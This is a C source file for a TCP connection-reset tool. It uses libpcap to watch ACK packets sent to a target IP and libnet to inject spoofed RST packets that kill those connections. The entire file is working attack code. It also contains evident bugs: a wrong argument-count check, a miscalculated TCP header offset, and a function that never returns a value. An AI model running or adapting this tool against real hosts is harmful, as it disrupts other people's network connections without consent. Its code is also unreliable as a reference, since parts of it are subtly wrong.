#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet( u_char *, const struct pcap_pkthdr *, const u_char * );
int set_packet_filter( pcap_t *, struct in_addr * );

struct data_pass
{
    int    libnet_handle;
    u_char *packet;
};

int main( int argc, char *argv[])
{
    struct pcap_pkthdr cap_header;
    const u_char *packet, *pkt_data;
    pcap_t *pcap_handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *device;
    u_long target_ip;
    int network;
    struct data_pass critical_libnet_data;

    if ( argc < 1 )
    {
        printf("Usage : %s <target IP>\n",argv[0]);
        exit(0);
    }

    target_ip = libnet_name_resolve(argv[1],LIBNET_RESOLVE);
    if ( target_ip == -1 )
        fatal("Invalid target address");

    device  = pcap_lookupdev(errbuf);
    if ( device == NULL )
        fatal(errbuf);

    pcap_handle = pcap_open_live( device, 128, 1, 0, errbuf );
    if ( pcap_handle == NULL )
        fatal(errbuf);

    critical_libnet_data.libnet_handle = libnet_open_raw_sock( IPPROTO_RAW );
    if ( critical_libnet_data.libnet_handle == -1 )
        libnet_error( LIBNET_ERR_FATAL, "can't open interface - run as root\n" );

    libnet_init_packet( LIBNET_IPV4_H + LIBNET_TCP_H, &(critical_libnet_data.packet) );
    if ( critical_libnet_data.packet == NULL )
        libnet_error( LIBNET_ERR_FATAL,"can't initialize packet memory.\n" );

    libnet_seed_prand();

    set_packet_filter( pcap_handle, (struct in_addr *)&target_ip );

    printf("Resetting all TCP connections to %s on %s\n",argv[1],device);
    pcap_loop( pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data );

    pcap_close(pcap_handle);
}

/*
 * This function is used to set a
 * Packet Filter to look for an established connection
 * to the target IP
 */
int set_packet_filter( pcap_t *pcap_hdl, struct in_addr *target_ip )
{
    struct bpf_program filter;
    char   filter_string[100];

    sprintf(filter_string,"tcp[flags] & tcp-ack != 0 and dst host %s",inet_ntoa(*(target_ip)));

    printf("[DEBUG] filter string is '%s' \n",filter_string);
    if ( pcap_compile( pcap_hdl, &filter, filter_string, 0, 0 ) == -1 )
        fatal("pcap compile failed");

    if ( pcap_setfilter( pcap_hdl, &filter) == -1 )
        fatal("pcap_setfilter failed");
}

/*
 * Callback function that is called everytime
 * the pcap_loop() function is executed
 */
void caught_packet( u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet )
{
    u_char *pkt_data;
    struct libnet_ip_hdr *IPhdr;
    struct libnet_tcp_hdr *TCPhdr;
    struct data_pass *passed;
    int    bcount;

    passed = (struct data_pass *)user_args;

    IPhdr  = (struct libnet_ip_hdr *)(packet + LIBNET_ETH_H);
    TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_IPV4_H + LIBNET_TCP_H);

    printf("resetting TCP connections from %s:%d",inet_ntoa(IPhdr->ip_src),htons(TCPhdr->th_sport));
    printf("<---> %s:%d\n",inet_ntoa(IPhdr->ip_dst),htons(TCPhdr->th_dport));

    libnet_build_ip(LIBNET_IPV4_H,
            IPTOS_LOWDELAY,
            libnet_get_prand(LIBNET_PRu16),
            0,
            libnet_get_prand(LIBNET_PR8),
            IPPROTO_TCP,
            *((u_long *)&(IPhdr->ip_dst)),
            *((u_long *)&(IPhdr->ip_src)),
            NULL,
            0,
            passed->packet);
    libnet_build_tcp(htons(TCPhdr->th_dport),
            htons(TCPhdr->th_sport),
            htons(TCPhdr->th_ack),
            libnet_get_prand(LIBNET_PRu32),
            TH_RST,
            libnet_get_prand(LIBNET_PRu16),
            0,
            NULL,
            0,
            (passed->packet) + LIBNET_IPV4_H);

    if (libnet_do_checksum(passed->packet,IPPROTO_TCP,LIBNET_TCP_H) == -1)
        libnet_error(LIBNET_ERR_FATAL,"can't compute checksum\n");

    bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IPV4_H+LIBNET_TCP_H);
    if ( bcount < LIBNET_IP_H + LIBNET_TCP_H )
        libnet_error(LIBNET_ERR_WARNING,"Warning : Incomplete packet written.");

    usleep(5000);
}
